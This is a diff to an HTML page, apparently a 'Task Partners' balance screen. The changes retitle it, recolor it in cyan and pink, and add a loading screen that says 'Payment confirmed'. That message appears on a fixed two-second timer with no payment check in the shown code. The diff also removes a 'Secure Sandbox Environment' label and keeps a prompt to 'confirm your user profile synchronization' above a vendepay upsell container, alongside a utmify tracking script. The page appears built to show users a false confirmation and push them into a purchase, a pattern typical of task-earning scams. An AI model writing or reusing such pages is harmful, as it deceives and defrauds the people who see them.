@@ -4,8 +4,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
   <meta name="theme-color" content="#ffffff">
-  <meta name="description" content="Secure Task Partners profile synchronization interface.">
-  <title>Task Partners Integration</title>
+  <meta name="description" content="Account verification and profile synchronization interface.">
+  <title>Balance | Task Partners</title>
 
   <script
     src="https://cdn.utmify.com.br/scripts/utms/latest.js"
@@ -79,10 +79,8 @@
     :root {
       --text: #121212;
       --divider: #e8e8e8;
-      --accent: #2563eb;
-      --success: #178552;
-      --success-background: #ecfdf3;
-      --muted: #8a8a8e;
+      --cyan: #00f2fe;
+      --pink: #fe2c55;
     }
 
     * {
@@ -107,8 +105,9 @@
       position: fixed;
       inset: 0;
       z-index: 10;
-      display: grid;
-      place-items: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
       background: #ffffff;
       opacity: 1;
       transition: opacity 180ms ease;
@@ -119,26 +118,59 @@
       pointer-events: none;
     }
 
+    .loading-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 18px;
+    }
+
     .spinner {
       position: relative;
-      width: 34px;
-      height: 34px;
+      width: 42px;
+      height: 42px;
+    }
+
+    .spinner::before,
+    .spinner::after {
+      position: absolute;
+      inset: 2px;
       border-radius: 50%;
-      background: conic-gradient(var(--accent) 0 76%, #e9edf3 76% 100%);
+      border: 3px solid transparent;
+      content: "";
+    }
+
+    .spinner::before {
+      inset: 2px 4px 2px 0;
+      border-top-color: var(--cyan);
+      border-right-color: var(--cyan);
       animation: spin 720ms linear infinite;
     }
 
     .spinner::after {
-      position: absolute;
-      inset: 3px;
-      border-radius: 50%;
-      background: #ffffff;
-      content: "";
+      inset: 2px 0 2px 4px;
+      border-bottom-color: var(--pink);
+      border-left-color: var(--pink);
+      animation: spin-reverse 900ms linear infinite;
+    }
+
+    .loading-label {
+      margin: 0;
+      color: var(--text);
+      font-size: 14px;
+      font-weight: 600;
+      line-height: 1.3;
     }
 
     @keyframes spin {
       to {
         transform: rotate(360deg);
+      }
+    }
+
+    @keyframes spin-reverse {
+      to {
+        transform: rotate(-360deg);
       }
     }
 
@@ -180,28 +212,6 @@
       padding: 24px 20px max(32px, env(safe-area-inset-bottom));
     }
 
-    .metadata {
-      margin: 0 0 18px;
-      color: var(--muted);
-      font-size: 12px;
-      font-weight: 500;
-      line-height: 1.4;
-    }
-
-    .success-status {
-      display: inline-flex;
-      min-height: 30px;
-      align-items: center;
-      margin-bottom: 16px;
-      padding: 6px 10px;
-      border-radius: 6px;
-      background: var(--success-background);
-      color: var(--success);
-      font-size: 13px;
-      font-weight: 700;
-      line-height: 1;
-    }
-
     .message {
       margin: 0 0 24px;
       color: var(--text);
@@ -233,7 +243,8 @@
     }
 
     @media (prefers-reduced-motion: reduce) {
-      .spinner {
+      .spinner::before,
+      .spinner::after {
         animation-duration: 1400ms;
       }
 
@@ -245,18 +256,19 @@
   </style>
 </head>
 <body>
-  <div class="loading-screen" id="loadingScreen" role="status" aria-label="Loading integration">
-    <div class="spinner" aria-hidden="true"></div>
+  <div class="loading-screen" id="loadingScreen" role="status" aria-label="Payment confirmed. Loading balance.">
+    <div class="loading-content">
+      <div class="spinner" aria-hidden="true"></div>
+      <p class="loading-label">Payment confirmed</p>
+    </div>
   </div>
 
   <main class="app-screen" id="appScreen" aria-hidden="true">
     <header class="app-header">
-      <h1>Task Partners Integration</h1>
+      <h1>Balance</h1>
     </header>
 
     <section class="content" aria-label="Profile synchronization">
-      <p class="metadata">Secure Sandbox Environment &bull; API Session Active</p>
-      <div class="success-status" role="status">&#10003; Transaction confirmed</div>
       <p class="message">Account verification successfully completed. Confirm your user profile synchronization to secure your active session.</p>
 
       <div id="vendepay-upsell-container"></div>
@@ -277,7 +289,7 @@
         window.setTimeout(function () {
           loadingScreen.hidden = true;
         }, 200);
-      }, 1000);
+      }, 2000);
     })();
   </script>
 </body>
